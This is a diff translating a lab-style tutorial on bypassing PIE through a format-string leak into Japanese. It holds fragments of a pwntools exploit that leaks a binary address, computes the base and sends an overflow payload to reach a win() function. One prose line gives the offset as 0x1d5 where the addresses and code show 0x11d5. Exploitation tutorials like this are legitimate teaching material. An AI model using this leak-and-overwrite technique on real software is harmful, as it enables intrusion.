@@ -1,5 +1,5 @@
 ---
-description: Using format string
+description: フォーマット文字列を使う
 ---
 
 # PIE Bypass
@@ -37,7 +37,7 @@ void win() {
 }
 ```
 
-Unlike last time, we don't get given a function. We'll have to leak it with format strings.
+前回とは違い、今回は関数のアドレスを教えてもらえません。フォーマット文字列を使ってリークする必要があります。
 
 ## Analysis
 
@@ -51,13 +51,13 @@ What's your message?
 hello
 ```
 
-Everything's as we expect.
+すべて想定どおりです。
 
 ## Exploitation
 
 ### Setup
 
-As last time, first we set everything up.
+前回と同様に、まず準備をします。
 
 ```python
 from pwn import *
@@ -68,7 +68,7 @@ p = process()
 
 ### PIE Leak
 
-Now we just need a leak. Let's try a few offsets.
+次に必要なのはリークです。いくつかオフセットを試してみましょう。
 
 ```text
 $ ./vuln-32 
@@ -77,7 +77,7 @@ What's your name?
 Nice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1
 ```
 
-3rd one looks like a binary address, let's check the difference between the 3rd leak and the base address in radare2. Set a breakpoint somewhere after the format string leak \(doesn't really matter where\).
+3番目がバイナリのアドレスのようです。radare2 で、この3番目のリーク値とベースアドレスの差を確認しましょう。フォーマット文字列のリークより後であれば、どこでもよいのでブレークポイントを設定します(場所はあまり重要ではありません)。
 
 ```text
 $ r2 -d -A vuln-32 
@@ -92,7 +92,7 @@ What's your name?
 Nice to meet you 0x565f01d5
 ```
 
-We can see the base address is `0x565ef000` and the leaked value is `0x565f01d5`. Therefore, subtracting `0x1d5` from the leaked address should give us the binary. Let's leak the value and get the base address.
+ベースアドレスは `0x565ef000`、リークした値は `0x565f01d5` です。したがって、リークしたアドレスから `0x1d5` を引けばバイナリのベースが得られるはずです。値をリークして、ベースアドレスを求めましょう。
 
 ```python
 p.recvuntil('name?\n')
@@ -105,7 +105,7 @@ elf.address = elf_leak - 0x11d5
 log.success(f'PIE base: {hex(elf.address)}') # not required, but a nice check
 ```
 
-Now we just need to send the exploit payload.
+あとはエクスプロイトのペイロードを送るだけです。
 
 ```python
 payload = b'A' * 32
@@ -145,9 +145,8 @@ print(p.clean().decode())
 
 ## 64-bit
 
-Same deal, just 64-bit. Try it out :\)
+やることは同じで、64ビットになるだけです。試してみてください :\)
 
 {% file src="../../../.gitbook/assets/pie-fmtstr-64.zip" caption="PIE + Format String - 64-bit" %}
-
 
 
